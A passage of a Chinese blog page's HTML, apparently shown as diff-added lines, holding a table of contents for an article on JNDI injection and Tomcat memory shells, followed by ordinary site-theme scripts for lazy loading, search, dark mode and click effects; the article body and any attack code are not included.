+<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#JNDI%E6%B3%A8%E5%85%A5-%C3%97-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE-%C3%97-%E5%86%85%E5%AD%98%E9%A9%AC%E8%81%94%E5%8A%A8"><span class="toc-text">JNDI注入 × 反序列化链 × 内存马联动</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95"><span class="toc-text">目录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%A4%E7%A7%8DJNDI%E6%B3%A8%E5%85%A5%E6%96%B9%E5%BC%8F%E5%AF%B9%E6%AF%94"><span class="toc-text">两种JNDI注入方式对比</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E6%96%B9%E5%BC%8F%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90"><span class="toc-text">反序列化链方式原理分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#LDAP-Entry%E4%B8%AD%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96%E6%95%B0%E6%8D%AE"><span class="toc-text">LDAP Entry中的序列化数据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A6%E5%8F%91%E7%82%B9%EF%BC%9ADirectoryManager%E6%BA%90%E7%A0%81%E8%BF%BD%E8%B8%AA"><span class="toc-text">触发点：DirectoryManager源码追踪</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%8E%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-text">环境搭建与漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%90%AD%E5%BB%BA%E6%81%B6%E6%84%8FLDAP%E6%9C%8D%E5%8A%A1"><span class="toc-text">搭建恶意LDAP服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A6%E5%8F%91%E9%AA%8C%E8%AF%81"><span class="toc-text">触发验证</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%81%94%E5%8A%A8%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5"><span class="toc-text">联动内存马注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E9%93%BE%E8%AE%BE%E8%AE%A1%E6%80%9D%E8%B7%AF"><span class="toc-text">攻击链设计思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96StandardContext%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F"><span class="toc-text">获取StandardContext的几种方式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E5%BC%8F%E4%B8%80%EF%BC%9AThread-%E8%8E%B7%E5%8F%96-StandardContext%EF%BC%88%E5%B8%B8%E7%94%A8%EF%BC%89"><span class="toc-text">方式一：Thread 获取 StandardContext（常用）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E5%BC%8F%E4%BA%8C%EF%BC%9AJMX-%E8%8E%B7%E5%8F%96-StandardContext%EF%BC%88%E5%85%9C%E5%BA%95%E6%96%B9%E6%A1%88%EF%BC%89"><span class="toc-text">方式二：JMX 获取 StandardContext（兜底方案）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CmdFilter%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-text">CmdFilter内存马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TemplatesImpl%E5%8A%A0%E8%BD%BD%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%97%E8%8A%82%E7%A0%81"><span class="toc-text">TemplatesImpl加载内存马字节码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4%E6%89%93%E6%B3%95%E6%BC%94%E7%A4%BA"><span class="toc-text">完整打法演示</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li></ol></li></ol></div><div class="widget-footer"><a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><!-- Icon from Solar by 480 Design - https://creativecommons.org/licenses/by/4.0/ --><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="1.5"><path stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/><path d="M7 3.338A9.95 9.95 0 0 1 12 2c5.523 0 10 4.477 10 10s-4.477 10-10 10S2 17.523 2 12c0-1.821.487-3.53 1.338-5"/></g></svg><span>回到顶部</span></a></div></widget>
+</div></aside><div class='float-panel'>
+  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
+  </button>
+  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
+  </button>
+</div>
+</div><div class="scripts">
+
+
+<script type="text/javascript">
+  window.canonical = {"originalHost":null,"officialHosts":["localhost"],"encoded":""};
+  const ctx = {
+    date_suffix: {
+      just: `刚刚`,
+      min: `分钟前`,
+      hour: `小时前`,
+      day: `天前`,
+    },
+    root : `/`,
+    tag_plugins: {
+      chat: Object.assign({"api":"https://siteinfo.listentothewind.cn/api/v1"}),
+    }
+  };
+
+  // required plugins (only load if needs)
+  if (`local_search`) {
+    ctx.search = {};
+    ctx.search.service = `local_search`;
+    if (ctx.search.service == 'local_search') {
+      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"skip_search":null,"sort":"-date"}`);
+      ctx.search[ctx.search.service] = service_obj;
+    }
+  }
+  const def = {
+    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/3442075.svg`,
+    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/cover/76b86c0226ffd.svg`,
+    loading: `https://api.iconify.design/eos-icons:three-dots-loading.svg?color=%231cd0fd`,
+  };
+  const deps = {
+    jquery: `https://gcore.jsdelivr.net/npm/jquery@3.7/dist/jquery.min.js`,
+    marked: `https://gcore.jsdelivr.net/npm/marked@13.0/lib/marked.umd.min.js`,
+    lazyload: `/%5Bobject%20Object%5D`
+  }
+  
+
+</script>
+
+<script type="text/javascript">
+  
+  function RunItem() {
+    this.list = []; // 存放回调函数
+    this.start = () => {
+      for (var i = 0; i < this.list.length; i++) {
+        this.list[i].run();
+      }
+    };
+    this.push = (fn, name, setRequestAnimationFrame = true) => {
+      let myfn = fn
+      if (setRequestAnimationFrame) {
+        myfn = () => {
+          utils.requestAnimationFrame(fn)
+        }
+      }
+      var f = new Item(myfn, name);
+      this.list.push(f);
+    };
+    this.remove = (name) => {
+      for (let index = 0; index < this.list.length; index++) {
+        const e = this.list[index];
+        if (e.name == name) {
+          this.list.splice(index, 1);
+        }
+      }
+    }
+    // 构造一个可以run的对象
+    function Item(fn, name) {
+      // 函数名称
+      this.name = name || fn.name;
+      // run方法
+      this.run = () => {
+        try {
+          fn()
+        } catch (error) {
+          console.log(error);
+        }
+      };
+    }
+  }
+
+  const utils = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    css: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    js: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      if (src.startsWith('/')) {
+        src = ctx.root + src.substring(1);
+      }
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function () {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    jq: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        utils.js(deps.jquery).then(fn)
+      } else {
+        fn()
+      }
+    },
+
+    onLoading: (el) => {
+      if (el) {
+        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
+      }
+    },
+    onLoadSuccess: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap').remove();
+      }
+    },
+    onLoadFailure: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap svg').remove();
+        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
+        $(el).find('.loading-wrap').addClass('error');
+      }
+    },
+    request: (el, url, callback, onFailure) => {
+      const maxRetry = 3;
+      let retryCount = 0;
+
+      return new Promise((resolve, reject) => {
+        const load = () => {
+          utils.onLoading?.(el);
+
+          let timedOut = false;
+          const timeout = setTimeout(() => {
+            timedOut = true;
+            console.warn('[request] 超时:', url);
+
+            if (++retryCount >= maxRetry) {
+              utils.onLoadFailure?.(el);
+              onFailure?.();
+              reject('请求超时');
+            } else {
+              setTimeout(load, 1000);
+            }
+          }, 5000);
+
+          fetch(url).then(resp => {
+            if (timedOut) return;
+            clearTimeout(timeout);
+
+            if (!resp.ok) throw new Error('响应失败');
+            return resp;
+          }).then(data => {
+            if (timedOut) return;
+            utils.onLoadSuccess?.(el);
+            callback(data);
+            resolve(data);
+          }).catch(err => {
+            clearTimeout(timeout);
+            console.warn('[request] 错误:', err);
+
+            if (++retryCount >= maxRetry) {
+              utils.onLoadFailure?.(el);
+              onFailure?.();
+              reject(err);
+            } else {
+              setTimeout(load, 1000);
+            }
+          });
+        };
+
+        load();
+      });
+    },
+    requestWithoutLoading: (url, options = {}, maxRetry = 2, timeout = 5000) => {
+      return new Promise((resolve, reject) => {
+        let retryCount = 0;
+
+        const tryRequest = () => {
+          let timedOut = false;
+          const timer = setTimeout(() => {
+            timedOut = true;
+            if (++retryCount > maxRetry) reject('timeout');
+            else tryRequest();
+          }, timeout);
+
+          fetch(url, options)
+            .then(resp => {
+              clearTimeout(timer);
+              if (!resp.ok) throw new Error('bad response');
+              resolve(resp);
+            })
+            .catch(err => {
+              clearTimeout(timer);
+              if (++retryCount > maxRetry) reject(err);
+              else setTimeout(tryRequest, 500);
+            });
+        };
+
+        tryRequest();
+      });
+    },
+    /********************** requestAnimationFrame ********************************/
+    // 1、requestAnimationFrame 会把每一帧中的所有 DOM 操作集中起来，在一次重绘或回流中就完成，并且重绘或回流的时间间隔紧紧跟随浏览器的刷新频率，一般来说，这个频率为每秒60帧。
+    // 2、在隐藏或不可见的元素中，requestAnimationFrame 将不会进行重绘或回流，这当然就意味着更少的的 cpu，gpu 和内存使用量。
+    requestAnimationFrame: (fn) => {
+      if (!window.requestAnimationFrame) {
+        window.requestAnimationFrame = window.requestAnimationFrame || window.mozRequestAnimationFrame || window.webkitRequestAnimationFrame;
+      }
+      window.requestAnimationFrame(fn)
+    },
+    dark: {},
+  };
+
+  // utils.dark.mode 当前模式 dark or light
+  // utils.dark.toggle() 暗黑模式触发器
+  // utils.dark.push(callBack[,"callBackName"]) 传入触发器回调函数
+  utils.dark.method = {
+    toggle: new RunItem(),
+  };
+  utils.dark = Object.assign(utils.dark, {
+    push: utils.dark.method.toggle.push,
+  });
+</script>
+<script>
+  const sidebar = {
+    leftbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    rightbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('rightbar');
+        l_body.removeAttribute('leftbar');
+      }
+    },
+    dismiss: () => {
+      if (l_body) {
+        l_body.removeAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    toggleTOC: () => {
+      document.querySelector('#data-toc').classList.toggle('collapse');
+    }
+  }
+</script>
+<script type="text/javascript">
+  (() => {
+    const tagSwitchers = document.querySelectorAll('.tag-subtree.parent-tag > a > .tag-switcher-wrapper')
+    for (const tagSwitcher of tagSwitchers) {
+      tagSwitcher.addEventListener('click', (e) => {
+        const parent = e.target.closest('.tag-subtree.parent-tag')
+        parent.classList.toggle('expanded')
+        e.preventDefault()
+      })
+    }
+
+    // Get active tag from query string, then activate it.
+    const urlParams = new URLSearchParams(window.location.search)
+    const activeTag = urlParams.get('tag')
+    if (activeTag) {
+      let tag = document.querySelector(`.tag-subtree[data-tag="${activeTag}"]`)
+      if (tag) {
+        tag.querySelector('a').classList.add('active')
+        
+        while (tag) {
+          tag.classList.add('expanded')
+          tag = tag.parentElement.closest('.tag-subtree.parent-tag')
+        }
+      }
+    }
+  })()
+</script>
+
+<script async src="https://gcore.jsdelivr.net/npm/vanilla-lazyload@19.1/dist/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazy",
+    callback_loaded: (el) => {
+      el.classList.add('loaded');
+      const wrapper = el.closest('.lazy-box');
+      const icon = wrapper?.querySelector('.lazy-icon');
+      if (icon) icon.remove();
+    }
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    window.lazyLoadInstance?.update();
+  });
+
+  window.wrapLazyloadImages = (container) => {
+    if (typeof container === 'string') {
+      container = document.querySelector(container);
+    }
+    if (!container) return;
+    
+    const images = container.querySelectorAll('img');
+    images.forEach((img) => {
+      if (img.classList.contains('lazy')) return;
+
+      const src = img.getAttribute('src');
+      if (!src) return;
+
+      const wrapper = document.createElement('div');
+      wrapper.className = 'lazy-box';
+
+      const newImg = img.cloneNode();
+      newImg.removeAttribute('src');
+      newImg.setAttribute('data-src', src);
+      newImg.classList.add('lazy');
+
+      const icon = document.createElement('div');
+      icon.className = 'lazy-icon';
+      if (def.loading) {
+        icon.style.backgroundImage = `url("${def.loading}")`;
+      }
+
+      wrapper.appendChild(newImg);
+      wrapper.appendChild(icon);
+
+      img.replaceWith(wrapper);
+    });
+
+    // 通知 LazyLoad 更新
+    if (window.lazyLoadInstance?.update) {
+      window.lazyLoadInstance.update();
+    }
+  }
+  
+</script>
+
+<!-- required -->
+<script src="/js/main.js?v=1.33.1" defer></script>
+
+<script type="text/javascript">
+  const applyTheme = (theme) => {
+    document.documentElement.setAttribute('data-theme', theme)
+  }
+
+  const switchTheme = () => {
+    const currentTheme = document.documentElement.getAttribute('data-theme')
+    let newTheme;
+    if (currentTheme === 'light') {
+      newTheme = 'dark'
+    } else {
+      newTheme = 'light'
+    }
+    applyTheme(newTheme)
+    window.localStorage.setItem('Stellar.theme', newTheme)
+    
+    const messages = {
+      light: `切换到浅色模式`,
+      dark: `切换到深色模式`,
+    }
+    hud?.toast?.(messages[newTheme])
+  }
+
+  (() => {
+    const theme = window.localStorage.getItem('Stellar.theme')
+    if (theme !== null) {
+      applyTheme(theme)
+    } else {
+      applyTheme('dark')
+    }
+  })()
+</script>
+
+<!-- optional -->
+
+
+
+<script defer>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"rating":{"js":"/js/services/rating.js","api":"https://star-vote.xaox.cc/api/rating"},"vote":{"js":"/js/services/vote.js","api":"https://star-vote.xaox.cc/api/vote"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"friends_and_posts":{"js":"/js/services/friends_and_posts.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"},"voice":{"js":"/js/plugins/voice.js"},"video":{"js":"/js/plugins/video.js"},"download-file":{"js":"/js/plugins/download-file.js"},"twikoo":{"js":"/js/services/twikoo_latest_comment.js"},"waline":{"js":"/js/services/waline_latest_comment.js"},"artalk":{"js":"/js/services/artalk_latest_comment.js"},"giscus":{"js":"/js/services/giscus_latest_comment.js"},"contributors":{"edit_this_page":{"_posts/":null,"wiki/stellar/":"https://github.com/xaoxuu/hexo-theme-stellar-docs/blob/main/"},"js":"/js/services/contributors.js"}}`));
+    for (let id of Object.keys(ctx.services)) {
+      const js = ctx.services[id].js;
+      if (id == 'siteinfo') {
+        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
+        if (ctx.cardlinks?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            setCardLink(ctx.cardlinks);
+          });
+        }
+      } else if (id == 'voice') {
+        ctx.voiceAudios = document.querySelectorAll('.voice>audio');
+        if (ctx.voiceAudios?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            createVoiceDom(ctx.voiceAudios);
+          });
+        }
+      } else if (id == 'video') {
+        ctx.videos = document.querySelectorAll('.video>video');
+        if (ctx.videos?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            videoEvents(ctx.videos);
+          });
+        }
+      } else if (id == 'download-file') {
+        ctx.files = document.querySelectorAll('.file');
+        if (ctx.files?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            downloadFileEvent(ctx.files);
+          });
+        }
+      } else {
+        const els = document.getElementsByClassName(`ds-${id}`);
+        if (els?.length > 0) {
+          utils.jq(() => {
+            if (id == 'timeline' || 'memos' || 'marked') {
+              utils.js(deps.marked).then(function () {
+                utils.js(js, { defer: true });
+              });
+            } else {
+              utils.js(js, { defer: true });
+            }
+          });
+        }
+      }
+    }
+
+    // chat iphone time
+    let phoneTimes = document.querySelectorAll('.chat .status-bar .time');
+
+    if (phoneTimes.length > 0) {
+      NowTime();
+      var date = new Date();
+      var sec = date.getSeconds();
+      var firstAdjustInterval = setInterval(firstAdjustTime, 1000 * (60 - sec));
+    }
+
+    function firstAdjustTime() {
+      NowTime();
+      clearInterval(firstAdjustInterval);
+      setInterval(NowTime, 1000 * 60);
+    }
+
+    function NowTime() {
+      for (let i = 0; i < phoneTimes.length; ++i) {
+        var timeSpan = phoneTimes[i];
+        var date = new Date();
+        var hour = date.getHours();
+        var min = date.getMinutes();
+        timeSpan.innerHTML = check(hour) + ":" + check(min);
+      }
+    };
+
+    function check(val) {
+      if (val < 10) {
+        return ("0" + val);
+      }
+      return (val);
+    }
+
+    // chat quote
+    const chat_quote_obverser = new IntersectionObserver((entries, observer) => {
+      entries.filter((entry) => { return entry.isIntersecting }).sort((a, b) => a.intersectionRect.y !== b.intersectionRect.y ? a.intersectionRect.y - b.intersectionRect.y : a.intersectionRect.x - b.intersectionRect.x).forEach((entry, index) => {
+          observer.unobserve(entry.target);
+          setTimeout(() => {
+            entry.target.classList.add('quote-blink');
+            setTimeout(() => {
+              entry.target.classList.remove('quote-blink');
+            }, 1000);
+          }, Math.max(100, 16) * (index + 1));
+        });
+    });
+
+    var chatQuotes = document.querySelectorAll(".chat .talk .quote");
+    chatQuotes.forEach((quote) => {
+      quote.addEventListener('click', function () {
+        var chatCellDom = document.getElementById("quote-" + quote.getAttribute("quotedCellTag"));
+        if (chatCellDom) {
+          var chatDiv = chatCellDom.parentElement;
+          var mid = chatDiv.clientHeight / 2;
+          var offsetTop = chatCellDom.offsetTop;
+          if (offsetTop > mid - chatCellDom.clientHeight / 2) {
+            chatDiv.scrollTo({
+              top: chatCellDom.offsetTop - mid + chatCellDom.clientHeight / 2,
+              behavior: "smooth"
+            });
+          } else {
+            chatDiv.scrollTo({
+              top: 0,
+              behavior: "smooth"
+            });
+          }
+          chat_quote_obverser.observe(chatCellDom);
+        }
+      });
+    });
+  });
+</script>
+
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.search = {
+      path: `/search.json`,
+    }
+    utils.js('/js/search/local-search.js', { defer: true });
+  });
+</script><script>
+  window.FPConfig = {
+    delay: 0,
+    ignoreKeywords: [],
+    maxRPS: 5,
+    hoverDelay: 25
+  };
+</script>
+<script defer src="https://gcore.jsdelivr.net/npm/flying-pages@2/flying-pages.min.js"></script><script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    const swiper_api = document.getElementById('swiper-api');
+    if (swiper_api != undefined) {
+      utils.css(`https://unpkg.com/swiper@10.3/swiper-bundle.min.css`);
+      utils.js(`https://unpkg.com/swiper@10.3/swiper-bundle.min.js`, { defer: true }).then(function () {
+        const effect = swiper_api.getAttribute('effect') || '';
+        var swiper = new Swiper('.swiper#swiper-api', {
+          slidesPerView: 'auto',
+          spaceBetween: 8,
+          centeredSlides: true,
+          effect: effect,
+          rewind: true,
+          pagination: {
+            el: '.swiper-pagination',
+            clickable: true,
+          },
+          navigation: {
+            nextEl: '.swiper-button-next',
+            prevEl: '.swiper-button-prev',
+          },
+        });
+      })
+    }
+  });
+</script>
+<script>
+  document.addEventListener('DOMContentLoaded', function () {
+    window.codeElements = document.querySelectorAll('.code');
+    if (window.codeElements.length > 0) {
+      ctx.copycode = {
+        default_text: `Copy`,
+        success_text: `Copied`,
+        toast: `复制成功`,
+      };
+      utils.js('/js/plugins/copycode.js');
+    }
+  });
+</script>
+
+
+<!-- inject -->
+
+
+<!-- Custom Image Viewer -->
+<script src="/js/plugins/image-viewer.js"></script>
+
+<!-- Custom Context Menu -->
+<script src="/js/plugins/custom-context-menu.js"></script>
+
+<!-- Glitch Effect -->
+<script src="/js/plugins/glitch-effect.js"></script>
+
+<!-- Terminal Copy -->
+<script src="/js/plugins/terminal-copy.js"></script>
+
+<!-- Hotkeys -->
+<script src="/js/plugins/hotkeys.js"></script>
+
+<!-- Achievements / Card System -->
+<script src="/js/plugins/achievements.js"></script>
+
+<!-- Special Days - 节日彩蛋系统 -->
+<script src="/js/plugins/special-days.js"></script>
+
+<!-- Music Player -->
+<script src="/js/plugins/music-player.js"></script>
+
+<!-- Offline Vault - 断网保护机制 -->
+<script src="/js/plugins/offline-vault.js"></script>
+
+<!-- Live2D Widget - Local Version -->
+<script src="/live2d-widget/dist/autoload.js"></script>
+
+<!-- Live2D Widget 位置调整和默认显示 -->
+<style>
+  #waifu {
+    position: fixed !important;
+    bottom: 20px !important;
+    right: 20px !important;
+    left: auto !important;
+    z-index: 1000 !important;
+    transform: none !important;
+    display: block !important;
+    opacity: 1 !important;
+    visibility: visible !important;
+  }
+  #waifu #live2d {
+    position: relative !important;
+    transform: none !important;
+  }
+  #waifu-toolbar {
+    position: relative !important;
+    transform: none !important;
+  }
+  #waifu-toggle {
+    display: none !important;
+  }
+</style>
+
+<!-- 点击特效 -->
+<script>
+(function() {
+  var clickEffects = {
+    current: null,
+    
+    init: function() {
+      this.current = localStorage.getItem('clickEffect') || 'none';
+      this.bindEvents();
+    },
+    
+    bindEvents: function() {
+      var self = this;
+      document.addEventListener('click', function(e) {
+        if (self.current === 'none') return;
+        if (e.target.closest('button, a, input, textarea, select, .post-card, .layout-btn')) return;
+        self.createEffect(e.clientX, e.clientY);
+      });
+      
+      window.addEventListener('storage', function(e) {
+        if (e.key === 'clickEffect') {
+          self.current = e.newValue || 'none';
+        }
+      });
+    },
+    
+    createEffect: function(x, y) {
+      switch(this.current) {
+        case 'ripple': this.createRipple(x, y); break;
+        case 'firework': this.createFirework(x, y); break;
+        case 'particles': this.createParticles(x, y); break;
+        case 'text': this.createText(x, y); break;
+        default: break;
+      }
+    },
+    
+    createRipple: function(x, y) {
+      var ripple = document.createElement('div');
+      ripple.className = 'click-ripple';
+      ripple.style.cssText = 'position:fixed;left:' + x + 'px;top:' + y + 'px;width:0;height:0;border-radius:50%;background:rgba(52,152,219,0.4);transform:translate(-50%,-50%);pointer-events:none;z-index:9999;animation:rippleExpand 0.6s ease-out forwards;';
+      document.body.appendChild(ripple);
+      setTimeout(function() { ripple.remove(); }, 600);
+    },
+    
+    createFirework: function(x, y) {
+      var colors = ['#ff6b6b', '#feca57', '#48dbfb', '#ff9ff3', '#54a0ff'];
+      for (var i = 0; i < 12; i++) {
+        var particle = document.createElement('div');
+        var angle = (Math.PI * 2 / 12) * i;
+        var velocity = 50 + Math.random() * 30;
+        particle.style.cssText = 'position:fixed;left:' + x + 'px;top:' + y + 'px;width:6px;height:6px;border-radius:50%;background:' + colors[i % 5] + ';pointer-events:none;z-index:9999;transform:translate(-50%,-50%);';
+        document.body.appendChild(particle);
+        this.animateParticle(particle, x, y, x + Math.cos(angle) * velocity, y + Math.sin(angle) * velocity, 500);
+      }
+    },
+    
+    createParticles: function(x, y) {
+      var colors = ['#ff6b6b', '#feca57', '#48dbfb', '#ff9ff3', '#54a0ff', '#5f27cd'];
+      for (var i = 0; i < 8; i++) {
+        var particle = document.createElement('div');
+        particle.innerHTML = '✨';
+        particle.style.cssText = 'position:fixed;left:' + (x + (Math.random()-0.5)*30) + 'px;top:' + (y + (Math.random()-0.5)*30) + 'px;font-size:16px;pointer-events:none;z-index:9999;animation:particleFloat 0.8s ease-out forwards;';
+        document.body.appendChild(particle);
+        setTimeout(function(p) { return function() { p.remove(); }; }(particle), 800);
+      }
+    },
+    
+    createText: function(x, y) {
+      var texts = ['666', '厉害', 'nice', '棒', '赞', '给力'];
+      var text = document.createElement('div');
